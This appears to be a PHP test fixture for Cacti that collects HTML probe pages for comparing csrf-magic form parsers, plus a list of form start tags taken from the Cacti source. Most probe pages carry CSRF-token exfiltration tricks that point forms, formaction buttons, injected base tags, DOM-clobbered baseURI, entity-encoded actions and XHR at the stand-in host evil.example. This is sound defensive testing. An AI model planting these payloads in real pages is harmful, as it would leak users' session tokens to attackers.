<?php
/*
 +-------------------------------------------------------------------------+
 | Copyright (C) 2026 The Kadupul project and contributors                 |
 |                                                                         |
 | This program is free software; you can redistribute it and/or           |
 | modify it under the terms of the GNU General Public License             |
 | as published by the Free Software Foundation; either version 2          |
 | of the License, or (at your option) any later version.                  |
 +-------------------------------------------------------------------------+
 | Cacti: The Complete RRDtool-based Graphing Solution                     |
 +-------------------------------------------------------------------------+
*/

/* Pages from the CSRF probe runs and every distinct form start tag in the
 * lts source, as inputs for comparing the csrf-magic tag walkers. */
return array (
  'page p2' => '<!doctype html><html><head><script>var csrfMagicName=\'__csrf_magic\';var csrfMagicToken=\'T\';</script><script src="http://127.0.0.1:8765/before/csrf-magic.js"></script></head><body>
<form id=local method=post action="save.php"><input type=\'hidden\' name=\'__csrf_magic\' value="SRV"><input type=hidden name=action value=save><input name=getAttribute><input name=appendChild><input name=method value=x><button id=b1>ok</button><button id=bevil formaction="http://evil.example/x">evil</button><input id=img type=image formaction="http://evil.example/img" src="data:,"><button id=bempty formaction="">e</button><button id=bget formmethod=get formaction="http://evil.example/g">g</button></form>
<button id=outside form=local formaction="http://evil.example/out">outside</button>
<form id=cross method=post action="http://evil.example/collect"><input type=\'hidden\' name=\'__csrf_magic\' value="SRV"><input type=hidden name=action value=save><button id=b2>x</button></form>
<form id=dyn method=post action="save.php"><button id=b3>ok</button></form>
<form id=noserver method=post action="save.php"><input type=hidden name=action value=save><button id=b4>ok</button></form>
<form id=crossnoserver method=post action="http://evil.example/c"><input type=hidden name=action value=save><button id=b5>x</button></form>
<form id=noaction method=post><button id=b7>ok</button></form>
<form id=pc method=POST action="//127.0.0.1:8765/save.php"><button id=b8>ok</button></form>
<form id=getf method=get action="save.php"><button id=b6>g</button></form>
<pre id=out></pre>
<script>
var o=[];var last=null;
window.addEventListener(\'submit\',function(e){e.preventDefault();var fd=new FormData(e.target,e.submitter);last=(e.target.id||\'?\')+\' \'+(fd.getAll(\'__csrf_magic\').join(\'|\')||\'none\');});
function t(name,fn){last=\'NOEVENT\';try{fn()}catch(x){last=\'ERR \'+x}o.push(name.padEnd(44)+last);}
function $(i){return document.getElementById(i)}
function xhr(name,url){var x=new XMLHttpRequest();x.csrf_send=function(d){o.push(name.padEnd(44)+d)};x.open(\'POST\',url);x.send(\'a=1\');}

CsrfMagic.end();
t(\'local click submit\', ()=>$(\'b1\').click());
t(\'local formaction evil button\', ()=>$(\'bevil\').click());
t(\'local again after foreign (leak/stuck?)\', ()=>$(\'b1\').click());
t(\'input type=image formaction evil\', ()=>$(\'img\').click());
t(\'empty formaction\', ()=>$(\'bempty\').click());
t(\'formmethod=get formaction evil\', ()=>$(\'bget\').click());
t(\'outside button form= formaction evil\', ()=>$(\'outside\').click());
t(\'requestSubmit(evil button)\', ()=>$(\'local\').requestSubmit($(\'bevil\')));
t(\'requestSubmit()\', ()=>$(\'local\').requestSubmit());
var nb=document.createElement(\'button\');nb.setAttribute(\'formaction\',\'http://evil.example/dyn\');$(\'dyn\').appendChild(nb);
t(\'dyn form default submit\', ()=>$(\'b3\').click());
t(\'dyn-added evil button\', ()=>nb.click());
t(\'dyn form default after evil\', ()=>$(\'b3\').click());
t(\'cross form w/ server token\', ()=>$(\'b2\').click());
t(\'noserver local (end() inserted)\', ()=>$(\'b4\').click());
t(\'crossnoserver (end() skipped)\', ()=>$(\'b5\').click());
t(\'no action attr\', ()=>$(\'b7\').click());
t(\'protocol-relative same host\', ()=>$(\'b8\').click());
t(\'GET form\', ()=>$(\'b6\').click());
xhr(\'xhr local\',\'save.php\'); xhr(\'xhr cross\',\'http://evil.example/\');
o.push(\'token inputs in local: \'+$(\'local\').querySelectorAll(\'[name=__csrf_magic]\').length);
$(\'out\').textContent=o.join(\'\\n\');
</script></body></html>',
  'page p2b' => '<!doctype html><html><head><script>var csrfMagicName=\'__csrf_magic\';var csrfMagicToken=\'T\';</script><script src="http://127.0.0.1:8765/before/csrf-magic.js"></script></head><body>
<form id=local method=post action="save.php"><input type=\'hidden\' name=\'__csrf_magic\' value="SRV"><input type=hidden name=action value=save><input name=getAttribute><input name=appendChild><button id=b1>ok</button><button id=bevil formaction="http://evil.example/x">evil</button><input id=img type=image formaction="http://evil.example/img" src="data:,"><button id=bempty formaction="">e</button><button id=bget formmethod=get formaction="http://evil.example/g">g</button></form>
<button id=outside form=local formaction="http://evil.example/out">outside</button>
<form id=cross method=post action="http://evil.example/collect"><input type=\'hidden\' name=\'__csrf_magic\' value="SRV"><input type=hidden name=action value=save><button id=b2>x</button></form>
<form id=dyn method=post action="save.php"><button id=b3>ok</button></form>
<form id=noserver method=post action="save.php"><input type=hidden name=action value=save><button id=b4>ok</button></form>
<form id=crossnoserver method=post action="http://evil.example/c"><input type=hidden name=action value=save><button id=b5>x</button></form>
<form id=noaction method=post><button id=b7>ok</button></form>
<form id=pc method=POST action="//127.0.0.1:8765/save.php"><button id=b8>ok</button></form>
<form id=getf method=get action="save.php"><button id=b6>g</button></form>
<pre id=out></pre>
<script>
var o=[];var last=null;
window.addEventListener(\'submit\',function(e){e.preventDefault();var fd=new FormData(e.target,e.submitter);last=(e.target.id||\'?\')+\' \'+(fd.getAll(\'__csrf_magic\').join(\'|\')||\'none\');});
function t(name,fn){last=\'NOEVENT\';try{fn()}catch(x){last=\'ERR \'+x}o.push(name.padEnd(44)+last);}
function $(i){return document.getElementById(i)}
function xhr(name,url){var x=new XMLHttpRequest();x.csrf_send=function(d){o.push(name.padEnd(44)+d)};x.open(\'POST\',url);x.send(\'a=1\');}

CsrfMagic.end();
t(\'local click submit\', ()=>$(\'b1\').click());
t(\'local formaction evil button\', ()=>$(\'bevil\').click());
t(\'local again after foreign (leak/stuck?)\', ()=>$(\'b1\').click());
t(\'input type=image formaction evil\', ()=>$(\'img\').click());
t(\'empty formaction\', ()=>$(\'bempty\').click());
t(\'formmethod=get formaction evil\', ()=>$(\'bget\').click());
t(\'outside button form= formaction evil\', ()=>$(\'outside\').click());
t(\'requestSubmit(evil button)\', ()=>$(\'local\').requestSubmit($(\'bevil\')));
t(\'requestSubmit()\', ()=>$(\'local\').requestSubmit());
var nb=document.createElement(\'button\');nb.setAttribute(\'formaction\',\'http://evil.example/dyn\');$(\'dyn\').appendChild(nb);
t(\'dyn form default submit\', ()=>$(\'b3\').click());
t(\'dyn-added evil button\', ()=>nb.click());
t(\'dyn form default after evil\', ()=>$(\'b3\').click());
t(\'cross form w/ server token\', ()=>$(\'b2\').click());
t(\'noserver local (end() inserted)\', ()=>$(\'b4\').click());
t(\'crossnoserver (end() skipped)\', ()=>$(\'b5\').click());
t(\'no action attr\', ()=>$(\'b7\').click());
t(\'protocol-relative same host\', ()=>$(\'b8\').click());
t(\'GET form\', ()=>$(\'b6\').click());
xhr(\'xhr local\',\'save.php\'); xhr(\'xhr cross\',\'http://evil.example/\');
o.push(\'token inputs in local: \'+$(\'local\').querySelectorAll(\'[name=__csrf_magic]\').length);
$(\'out\').textContent=o.join(\'\\n\');
</script></body></html>',
  'page p3' => '<!doctype html><html><head><base href="http://evil.example/"><script>var csrfMagicName=\'__csrf_magic\';var csrfMagicToken=\'T\';</script><script src="http://127.0.0.1:8765/before/csrf-magic.js"></script></head><body>
<form id=rel method=post action="save.php"><input type=\'hidden\' name=\'__csrf_magic\' value="SRV"><button id=b1>ok</button></form>
<form id=rel2 method=post action="save.php"><button id=b2>ok</button></form>
<form id=abs method=post action="http://127.0.0.1:8765/save.php"><button id=b3>ok</button></form>
<pre id=out></pre><script>
var o=[];var last=null;
window.addEventListener(\'submit\',function(e){e.preventDefault();var fd=new FormData(e.target,e.submitter);last=(e.target.id||\'?\')+\' \'+(fd.getAll(\'__csrf_magic\').join(\'|\')||\'none\');});
function t(name,fn){last=\'NOEVENT\';try{fn()}catch(x){last=\'ERR \'+x}o.push(name.padEnd(44)+last);}
function $(i){return document.getElementById(i)}
function xhr(name,url){var x=new XMLHttpRequest();x.csrf_send=function(d){o.push(name.padEnd(44)+d)};x.open(\'POST\',url);x.send(\'a=1\');}

CsrfMagic.end();
t(\'injected base, relative, server token\',()=>$(\'b1\').click());
t(\'injected base, relative, no server\',()=>$(\'b2\').click());
t(\'injected base, absolute local\',()=>$(\'b3\').click());
xhr(\'xhr relative under evil base\',\'save.php\');
$(\'out\').textContent=o.join(\'\\n\');</script></body></html>',
  'page p4' => '<!doctype html><html><head><script>var csrfMagicName=\'__csrf_magic\';var csrfMagicToken=\'T\';</script><script src="http://127.0.0.1:8765/before/csrf-magic.js"></script></head><body>
<form id=evil method=post action="http://evil.example/n"><input type=\'hidden\' name=\'__csrf_magic\' value="SRV">
<form id=legit method=post action="save.php"><input type=\'hidden\' name=\'__csrf_magic\' value="SRV"><input type=hidden name=action value=save><button id=b1>ok</button></form>
<pre id=out></pre><script>
var o=[];var last=null;
window.addEventListener(\'submit\',function(e){e.preventDefault();var fd=new FormData(e.target,e.submitter);last=(e.target.id||\'?\')+\' \'+(fd.getAll(\'__csrf_magic\').join(\'|\')||\'none\');});
function t(name,fn){last=\'NOEVENT\';try{fn()}catch(x){last=\'ERR \'+x}o.push(name.padEnd(44)+last);}
function $(i){return document.getElementById(i)}
function xhr(name,url){var x=new XMLHttpRequest();x.csrf_send=function(d){o.push(name.padEnd(44)+d)};x.open(\'POST\',url);x.send(\'a=1\');}

CsrfMagic.end();
o.push(\'legit form element exists: \'+!!$(\'legit\'));
t(\'nested: legit button inside injected form\',()=>$(\'b1\').click());
$(\'out\').textContent=o.join(\'\\n\');</script></body></html>',
  'page p5' => '<!doctype html><html><head><script>var csrfMagicName=\'__csrf_magic\';var csrfMagicToken=\'T\';</script><script src="http://127.0.0.1:8765/before/csrf-magic.js"></script></head><body>
<img name=baseURI src="data:,">
<form id=l2 method=post action="save.php"><button id=b2>ok</button></form>
<form id=l3 method=post action="save.php"><input type=\'hidden\' name=\'__csrf_magic\' value="SRV"><button id=b3>ok</button></form>
<pre id=out></pre><script>
var o=[];var last=null;
window.addEventListener(\'submit\',function(e){e.preventDefault();var fd=new FormData(e.target,e.submitter);last=(e.target.id||\'?\')+\' \'+(fd.getAll(\'__csrf_magic\').join(\'|\')||\'none\');});
function t(name,fn){last=\'NOEVENT\';try{fn()}catch(x){last=\'ERR \'+x}o.push(name.padEnd(44)+last);}
function $(i){return document.getElementById(i)}
function xhr(name,url){var x=new XMLHttpRequest();x.csrf_send=function(d){o.push(name.padEnd(44)+d)};x.open(\'POST\',url);x.send(\'a=1\');}

CsrfMagic.end();
o.push(\'document.baseURI: \'+String(document.baseURI));
t(\'baseURI clobbered, local form (end())\',()=>$(\'b2\').click());
t(\'baseURI clobbered, local form (server)\',()=>$(\'b3\').click());
xhr(\'xhr local, baseURI clobbered\',\'save.php\');
$(\'out\').textContent=o.join(\'\\n\');</script></body></html>',
  'page p6' => '<!doctype html><html><head><script>var csrfMagicName=\'__csrf_magic\';var csrfMagicToken=\'T\';</script><script src="http://127.0.0.1:8765/before/csrf-magic.js"></script></head><body>
<form id=l method=post action="save.php"><button id=b1>ok</button></form>
<pre id=out></pre><script>
var o=[];var last=null;
window.addEventListener(\'submit\',function(e){e.preventDefault();var fd=new FormData(e.target,e.submitter);last=(e.target.id||\'?\')+\' \'+(fd.getAll(\'__csrf_magic\').join(\'|\')||\'none\');});
function t(name,fn){last=\'NOEVENT\';try{fn()}catch(x){last=\'ERR \'+x}o.push(name.padEnd(44)+last);}
function $(i){return document.getElementById(i)}
function xhr(name,url){var x=new XMLHttpRequest();x.csrf_send=function(d){o.push(name.padEnd(44)+d)};x.open(\'POST\',url);x.send(\'a=1\');}

CsrfMagic.end();
var b=document.createElement(\'base\');b.href=\'http://evil.example/\';document.head.appendChild(b);
t(\'base added after load, relative form\',()=>$(\'b1\').click());
$(\'l\').setAttribute(\'action\',\'http://evil.example/late\');
t(\'action changed after load (click)\',()=>$(\'b1\').click());
$(\'l\').setAttribute(\'action\',\'save.php\'); b.remove();
t(\'restored\',()=>$(\'b1\').click());
$(\'out\').textContent=o.join(\'\\n\');</script></body></html>',
  'probe action-control' => '<!doctype html><html><head><script>var csrfMagicName=\'__csrf_magic\';var csrfMagicToken="sid:11a51a03e007dad0942a17b01c5836d203dbe856,1790815680";</script><script src=\'http://127.0.0.1:8765/before/net/csrf-magic.js\'></script></head><body><form method=post action=\'http://evil.example:8765/action-control\'><input type=hidden name=action value=save><button id=go>x</button></form><script>CsrfMagic.end();</script><script>setTimeout(function(){ document.getElementById(\'go\').click() }, 50);</script></body></html>',
  'probe action-late-click' => '<!doctype html><html><head><script>var csrfMagicName=\'__csrf_magic\';var csrfMagicToken="sid:11a51a03e007dad0942a17b01c5836d203dbe856,1790815680";</script><script src=\'http://127.0.0.1:8765/before/net/csrf-magic.js\'></script></head><body><form id=f method=\'post\' action=\'/sink/x\'><input type=\'hidden\' name=\'__csrf_magic\' value="sid:11a51a03e007dad0942a17b01c5836d203dbe856,1790815680" /><button id=go>x</button></form><script>CsrfMagic.end();</script><script>setTimeout(function(){ document.getElementById(\'f\').setAttribute(\'action\',\'http://evil.example:8765/action-late-click\');document.getElementById(\'go\').click() }, 50);</script></body></html>',
  'probe action-late-submit' => '<!doctype html><html><head><script>var csrfMagicName=\'__csrf_magic\';var csrfMagicToken="sid:11a51a03e007dad0942a17b01c5836d203dbe856,1790815680";</script><script src=\'http://127.0.0.1:8765/before/net/csrf-magic.js\'></script></head><body><form id=f method=\'post\' action=\'/sink/x\'><input type=\'hidden\' name=\'__csrf_magic\' value="sid:11a51a03e007dad0942a17b01c5836d203dbe856,1790815680" /><input type=hidden name=a value=1></form><script>CsrfMagic.end();</script><script>setTimeout(function(){ var f=document.getElementById(\'f\');f.setAttribute(\'action\',\'http://evil.example:8765/action-late-submit\');HTMLFormElement.prototype.submit.call(f); }, 50);</script></body></html>',
  'probe attr-in-attr' => '<!doctype html><html><head></head><body><form method=\'post\' title=" action=\'x.php\'" action=\'http://evil.example:8765/attr-in-attr\'><input type=\'hidden\' name=\'__csrf_magic\' value="sid:11a51a03e007dad0942a17b01c5836d203dbe856,1790815680" /><button id=go>x</button></form><script>setTimeout(function(){ document.getElementById(\'go\').click() }, 50);</script></body></html>',
  'probe base-late' => '<!doctype html><html><head><script>var csrfMagicName=\'__csrf_magic\';var csrfMagicToken="sid:11a51a03e007dad0942a17b01c5836d203dbe856,1790815680";</script><script src=\'http://127.0.0.1:8765/before/net/csrf-magic.js\'></script></head><body><form method=\'post\' action=\'x.php\'><input type=\'hidden\' name=\'__csrf_magic\' value="sid:11a51a03e007dad0942a17b01c5836d203dbe856,1790815680" /><button id=go>x</button></form><script>CsrfMagic.end();</script><script>setTimeout(function(){ var b=document.createElement(\'base\');b.href=\'http://evil.example:8765/base-late/\';document.head.appendChild(b);document.getElementById(\'go\').click() }, 50);</script></body></html>',
  'probe base-late-xhr' => '<!doctype html><html><head><script>var csrfMagicName=\'__csrf_magic\';var csrfMagicToken="sid:11a51a03e007dad0942a17b01c5836d203dbe856,1790815680";</script><script src=\'http://127.0.0.1:8765/before/net/csrf-magic.js\'></script></head><body><script>CsrfMagic.end();</script><script>setTimeout(function(){ var b=document.createElement(\'base\');b.href=\'http://evil.example:8765/base-late-xhr/\';document.head.appendChild(b);var x=new XMLHttpRequest();x.open(\'POST\',\'x.php\');x.setRequestHeader(\'Content-Type\',\'application/x-www-form-urlencoded\');x.send(\'a=1\'); }, 50);</script></body></html>',
  'probe base-static' => '<!doctype html><html><head><script>var csrfMagicName=\'__csrf_magic\';var csrfMagicToken="sid:11a51a03e007dad0942a17b01c5836d203dbe856,1790815680";</script><script src=\'http://127.0.0.1:8765/before/net/csrf-magic.js\'></script></head><body><base href=\'http://evil.example:8765/base-static/\'><form method=\'post\' action=\'x.php\'><input type=\'hidden\' name=\'__csrf_magic\' value="sid:11a51a03e007dad0942a17b01c5836d203dbe856,1790815680" /><button id=go>x</button></form><script>CsrfMagic.end();</script><script>setTimeout(function(){ document.getElementById(\'go\').click() }, 50);</script></body></html>',
  'probe baseuri-clobber' => '<!doctype html><html><head><script>var csrfMagicName=\'__csrf_magic\';var csrfMagicToken="sid:11a51a03e007dad0942a17b01c5836d203dbe856,1790815680";</script><script src=\'http://127.0.0.1:8765/before/net/csrf-magic.js\'></script></head><body><img name=baseURI src=\'data:,\'><form method=post action=\'/sink/baseuri-clobber\'><button id=go>x</button></form><script>CsrfMagic.end();</script><script>setTimeout(function(){ document.getElementById(\'go\').click() }, 50);</script></body></html>',
  'probe entity-newline' => '<!doctype html><html><head></head><body><form method=\'post\' action=\'&NewLine;//evil.example:8765/entity-newline\'><input type=\'hidden\' name=\'__csrf_magic\' value="sid:11a51a03e007dad0942a17b01c5836d203dbe856,1790815680" /><button id=go>x</button></form><script>setTimeout(function(){ document.getElementById(\'go\').click() }, 50);</script></body></html>',
  'probe entity-nosemi' => '<!doctype html><html><head></head><body><form method=\'post\' action=\'&#47&#47evil.example:8765/entity-nosemi\'><input type=\'hidden\' name=\'__csrf_magic\' value="sid:11a51a03e007dad0942a17b01c5836d203dbe856,1790815680" /><button id=go>x</button></form><script>setTimeout(function(){ document.getElementById(\'go\').click() }, 50);</script></body></html>',
  'probe form-attr' => '<!doctype html><html><head><script>var csrfMagicName=\'__csrf_magic\';var csrfMagicToken="sid:11a51a03e007dad0942a17b01c5836d203dbe856,1790815680";</script><script src=\'http://127.0.0.1:8765/before/net/csrf-magic.js\'></script></head><body><form id=f method=\'post\' action=\'/sink/form-attr\'><input type=\'hidden\' name=\'__csrf_magic\' value="sid:11a51a03e007dad0942a17b01c5836d203dbe856,1790815680" /><input type=hidden name=action value=save></form><button id=go form=f formaction=\'http://evil.example:8765/form-attr\'>x</button><script>CsrfMagic.end();</script><script>setTimeout(function(){ document.getElementById(\'go\').click() }, 50);</script></body></html>',
  'probe formaction' => '<!doctype html><html><head><script>var csrfMagicName=\'__csrf_magic\';var csrfMagicToken="sid:11a51a03e007dad0942a17b01c5836d203dbe856,1790815680";</script><script src=\'http://127.0.0.1:8765/before/net/csrf-magic.js\'></script></head><body><form method=\'post\' action=\'/sink/formaction\'><input type=\'hidden\' name=\'__csrf_magic\' value="sid:11a51a03e007dad0942a17b01c5836d203dbe856,1790815680" /><input type=hidden name=action value=save><button id=go formaction=\'http://evil.example:8765/formaction\'>x</button></form><script>CsrfMagic.end();</script><script>setTimeout(function(){ document.getElementById(\'go\').click() }, 50);</script></body></html>',
  'probe formaction-late' => '<!doctype html><html><head><script>var csrfMagicName=\'__csrf_magic\';var csrfMagicToken="sid:11a51a03e007dad0942a17b01c5836d203dbe856,1790815680";</script><script src=\'http://127.0.0.1:8765/before/net/csrf-magic.js\'></script></head><body><form id=f method=\'post\' action=\'/sink/formaction-late\'><input type=\'hidden\' name=\'__csrf_magic\' value="sid:11a51a03e007dad0942a17b01c5836d203dbe856,1790815680" /><input type=hidden name=action value=save></form><script>CsrfMagic.end();</script><script>setTimeout(function(){ var b=document.createElement(\'button\');b.id=\'go\';b.setAttribute(\'formaction\',\'http://evil.example:8765/formaction-late\');document.getElementById(\'f\').appendChild(b);document.getElementById(\'go\').click() }, 50);</script></body></html>',
  'probe get-method-attr' => '<!doctype html><html><head></head><body><form method=\'get\' title="method=\'post\'" action=\'http://evil.example:8765/get-method-attr\'><button id=go>x</button></form><script>setTimeout(function(){ document.getElementById(\'go\').click() }, 50);</script></body></html>',
  'probe image-input' => '<!doctype html><html><head><script>var csrfMagicName=\'__csrf_magic\';var csrfMagicToken="sid:11a51a03e007dad0942a17b01c5836d203dbe856,1790815680";</script><script src=\'http://127.0.0.1:8765/before/net/csrf-magic.js\'></script></head><body><form method=\'post\' action=\'/sink/image-input\'><input type=\'hidden\' name=\'__csrf_magic\' value="sid:11a51a03e007dad0942a17b01c5836d203dbe856,1790815680" /><input id=go type=image formaction=\'http://evil.example:8765/image-input\' src=\'data:,\' alt=x></form><script>CsrfMagic.end();</script><script>setTimeout(function(){ document.getElementById(\'go\').click() }, 50);</script></body></html>',
  'probe local-ok' => '<!doctype html><html><head><script>var csrfMagicName=\'__csrf_magic\';var csrfMagicToken="sid:11a51a03e007dad0942a17b01c5836d203dbe856,1790815680";</script><script src=\'http://127.0.0.1:8765/before/net/csrf-magic.js\'></script></head><body><form method=\'post\' action=\'/sink/local-ok\'><input type=\'hidden\' name=\'__csrf_magic\' value="sid:11a51a03e007dad0942a17b01c5836d203dbe856,1790815680" /><input type=hidden name=action value=save><button id=go>x</button></form><script>CsrfMagic.end();</script><script>setTimeout(function(){ document.getElementById(\'go\').click() }, 50);</script></body></html>',
  'probe method-control' => '<!doctype html><html><head><script>var csrfMagicName=\'__csrf_magic\';var csrfMagicToken="sid:11a51a03e007dad0942a17b01c5836d203dbe856,1790815680";</script><script src=\'http://127.0.0.1:8765/before/net/csrf-magic.js\'></script></head><body><form method=\'post\' action=\'/sink/a\'><input type=\'hidden\' name=\'__csrf_magic\' value="sid:11a51a03e007dad0942a17b01c5836d203dbe856,1790815680" /><input name=method value=x></form><form id=f method=post action=\'/sink/method-control\'><button id=go>x</button></form><script>CsrfMagic.end();</script><script>setTimeout(function(){ document.getElementById(\'go\').click() }, 50);</script></body></html>',
  'probe nested-js' => '<!doctype html><html><head><script>var csrfMagicName=\'__csrf_magic\';var csrfMagicToken="sid:11a51a03e007dad0942a17b01c5836d203dbe856,1790815680";</script><script src=\'http://127.0.0.1:8765/before/net/csrf-magic.js\'></script></head><body><form method=post action=\'http://evil.example:8765/nested-js\'><form method=\'post\'><input type=\'hidden\' name=\'__csrf_magic\' value="sid:11a51a03e007dad0942a17b01c5836d203dbe856,1790815680" /><button id=go>x</button></form><script>CsrfMagic.end();</script><script>setTimeout(function(){ document.getElementById(\'go\').click() }, 50);</script></body></html>',
  'probe nested-nojs' => '<!doctype html><html><head></head><body><form method=post action=\'http://evil.example:8765/nested-nojs\'><form method=\'post\'><input type=\'hidden\' name=\'__csrf_magic\' value="sid:11a51a03e007dad0942a17b01c5836d203dbe856,1790815680" /><button id=go>x</button></form><script>setTimeout(function(){ document.getElementById(\'go\').click() }, 50);</script></body></html>',
  'probe quoted-gt' => '<!doctype html><html><head></head><body><form method=\'post\' title=\'a><input type=\'hidden\' name=\'__csrf_magic\' value="sid:11a51a03e007dad0942a17b01c5836d203dbe856,1790815680" />b\' action=\'http://evil.example:8765/quoted-gt\'><button id=go>x</button></form><script>setTimeout(function(){ document.getElementById(\'go\').click() }, 50);</script></body></html>',
  'probe textarea-js' => '<!doctype html><html><head><script>var csrfMagicName=\'__csrf_magic\';var csrfMagicToken="sid:11a51a03e007dad0942a17b01c5836d203dbe856,1790815680";</script><script src=\'http://127.0.0.1:8765/before/net/csrf-magic.js\'></script></head><body><form method=post action=\'http://evil.example:8765/textarea-js\'><textarea name=x><form method=\'post\'><input type=\'hidden\' name=\'__csrf_magic\' value="sid:11a51a03e007dad0942a17b01c5836d203dbe856,1790815680" /></textarea><button id=go>x</button></form><script>CsrfMagic.end();</script><script>setTimeout(function(){ document.getElementById(\'go\').click() }, 50);</script></body></html>',
  'probe textarea-nojs' => '<!doctype html><html><head></head><body><form method=post action=\'http://evil.example:8765/textarea-nojs\'><textarea name=x><form method=\'post\'><input type=\'hidden\' name=\'__csrf_magic\' value="sid:11a51a03e007dad0942a17b01c5836d203dbe856,1790815680" /></textarea><button id=go>x</button></form><script>setTimeout(function(){ document.getElementById(\'go\').click() }, 50);</script></body></html>',
  'probe textarea-open' => '<!doctype html><html><head></head><body><script>addEventListener(\'load\',function(){HTMLFormElement.prototype.submit.call(document.forms[0])})</script><form method=post action=\'http://evil.example:8765/textarea-open\'><textarea name=x><p>page</p><form method=\'post\' action=\'/sink/legit\'><input type=\'hidden\' name=\'__csrf_magic\' value="sid:11a51a03e007dad0942a17b01c5836d203dbe856,1790815680" /><input name=z></form><script>setTimeout(function(){  }, 50);</script></body></html>',
  'probe xhr-cross' => '<!doctype html><html><head><script>var csrfMagicName=\'__csrf_magic\';var csrfMagicToken="sid:11a51a03e007dad0942a17b01c5836d203dbe856,1790815680";</script><script src=\'http://127.0.0.1:8765/before/net/csrf-magic.js\'></script></head><body><script>CsrfMagic.end();</script><script>setTimeout(function(){ var x=new XMLHttpRequest();x.open(\'POST\',\'http://evil.example:8765/xhr-cross\');x.setRequestHeader(\'Content-Type\',\'application/x-www-form-urlencoded\');x.send(\'a=1\'); }, 50);</script></body></html>',
  'source form 1' => '<html><body><form id=\'" . html_escape(x-><input name=\'x\'></form></body></html>',
  'source form 10' => '<html><body><form id=\'form_data_queries\' method=\'get\' action=\'data_queries.php\'><input name=\'x\'></form></body></html>',
  'source form 11' => '<html><body><form id=\'form_data_sources\' name=\'form_data_sources\' action=\'data_sources.php\'><input name=\'x\'></form></body></html>',
  'source form 12' => '<html><body><form id=\'form_data_template\' action=\'data_templates.php\'><input name=\'x\'></form></body></html>',
  'source form 13' => '<html><body><form id=\'form_devices\' action=\'host.php\'><input name=\'x\'></form></body></html>',
  'source form 14' => '<html><body><form id=\'form_devices\' method=\'get\' action=\'automation_devices.php\'><input name=\'x\'></form></body></html>',
  'source form 15' => '<html><body><form id=\'form_domains\' method=\'get\' action=\'user_domains.php\'><input name=\'x\'></form></body></html>',
  'source form 16' => '<html><body><form id=\'form_dsp\' action=\'data_source_profiles.php\'><input name=\'x\'></form></body></html>',
  'source form 17' => '<html><body><form id=\'form_gprint\' action=\'gprint_presets.php\'><input name=\'x\'></form></body></html>',
  'source form 18' => '<html><body><form id=\'form_graph_template\' action=\'graph_templates.php\'><input name=\'x\'></form></body></html>',
  'source form 19' => '<html><body><form id=\'form_graph_view\' method=\'post\'><input name=\'x\'></form></body></html>',
  'source form 2' => '<html><body><form id=\'form_at\' action=\'automation_templates.php\'><input name=\'x\'></form></body></html>',
  'source form 20' => '<html><body><form id=\'form_graph_view\'><input name=\'x\'></form></body></html>',
  'source form 21' => '<html><body><form id=\'form_graphs\' action=\'graphs.php\'><input name=\'x\'></form></body></html>',
  'source form 22' => '<html><body><form id=\'form_host_template\' action=\'host_templates.php\'><input name=\'x\'></form></body></html>',
  'source form 23' => '<html><body><form id=\'form_logfile\' action=\'utilities.php\'><input name=\'x\'></form></body></html>',
  'source form 24' => '<html><body><form id=\'form_plugins\' method=\'get\' action=\'plugins.php\'><input name=\'x\'></form></body></html>',
  'source form 25' => '<html><body><form id=\'form_poller\' action=\'pollers.php\'><input name=\'x\'></form></body></html>',
  'source form 26' => '<html><body><form id=\'form_pollercache\' action=\'utilities.php\'><input name=\'x\'></form></body></html>',
  'source form 27' => '<html><body><form id=\'form_rrdcheck\' method=\'get\' action=\'rrdcheck.php\'><input name=\'x\'></form></body></html>',
  'source form 28' => '<html><body><form id=\'form_rrdclean\' method=\'get\' action=\'rrdcleaner.php\'><input name=\'x\'></form></body></html>',
  'source form 29' => '<html><body><form id=\'form_site\' action=\'sites.php\'><input name=\'x\'></form></body></html>',
  'source form 3' => '<html><body><form id=\'form_automation\' action=\'automation_graph_rules.php\'><input name=\'x\'></form></body></html>',
  'source form 30' => '<html><body><form id=\'form_snmpagent_cache\' action=\'utilities.php\'><input name=\'x\'></form></body></html>',
  'source form 31' => '<html><body><form id=\'form_snmpagent_managers\' action=\'managers.php\'><input name=\'x\'></form></body></html>',
  'source form 32' => '<html><body><form id=\'form_snmpagent_managers\' name=\'form_snmpagent_managers\' action=\'managers.php\'><input name=\'x\'></form></body></html>',
  'source form 33' => '<html><body><form id=\'form_snmpagent_notifications\' action=\'utilities.php\'><input name=\'x\'></form></body></html>',
  'source form 34' => '<html><body><form id=\'form_snmpcache\' action=\'utilities.php\'><input name=\'x\'></form></body></html>',
  'source form 35' => '<html><body><form id=\'form_tree_devices\' action=\'tree.php\'><input name=\'x\'></form></body></html>',
  'source form 36' => '<html><body><form id=\'form_tree_graphs\' action=\'tree.php\'><input name=\'x\'></form></body></html>',
  'source form 37' => '<html><body><form id=\'form_tree_sites\' action=\'tree.php\'><input name=\'x\'></form></body></html>',
  'source form 38' => '<html><body><form id=\'form_tree\' action=\'tree.php\'><input name=\'x\'></form></body></html>',
  'source form 39' => '<html><body><form id=\'form_userlog\' action=\'utilities.php\'><input name=\'x\'></form></body></html>',
  'source form 4' => '<html><body><form id=\'form_automation\' action=\'automation_tree_rules.php\'><input name=\'x\'></form></body></html>',
  'source form 40' => '<html><body><form id=\'form_vdef\' action=\'vdef.php\'><input name=\'x\'></form></body></html>',
  'source form 41' => '<html><body><form id=\'forms\' action=\'aggregate_graphs.php\'><input name=\'x\'></form></body></html>',
  'source form 42' => '<html><body><form id=\'forms\' action=\'user_admin.php\'><input name=\'x\'></form></body></html>',
  'source form 43' => '<html><body><form id=\'forms\' action=\'user_group_admin.php\'><input name=\'x\'></form></body></html>',
  'source form 44' => '<html><body><form id=\'graphs_new\' action=\'graphs_new.php\'><input name=\'x\'></form></body></html>',
  'source form 45' => '<html><body><form id=\'links\' action=\'links.php\' method=\'post\'><input name=\'x\'></form></body></html>',
  'source form 46' => '<html><body><form id=\'logfile\'><input name=\'x\'></form></body></html>',
  'source form 47' => '<html><body><form id=\'networks\' action=\'automation_networks.php\'><input name=\'x\'></form></body></html>',
  'source form 48' => '<html><body><form id=\'snmp_form\'><input name=\'x\'></form></body></html>',
  'source form 49' => '<html><body><form id="form_template"><input name=\'x\'></form></body></html>',
  'source form 5' => '<html><body><form id=\'form_boost_utilities_stats\' method=\'post\'><input name=\'x\'></form></body></html>',
  'source form 50' => '<html><body><form id="forms"><input name=\'x\'></form></body></html>',
  'source form 51' => '<html><body><form method=\'post\' action=\'graph_realtime.php\' id=\'gform\'><input name=\'x\'></form></body></html>',
  'source form 52' => '<html><body><form method=\'post\' id=\'form_automation_tree\' action=\'page.php\'><input name=\'x\'></form></body></html>',
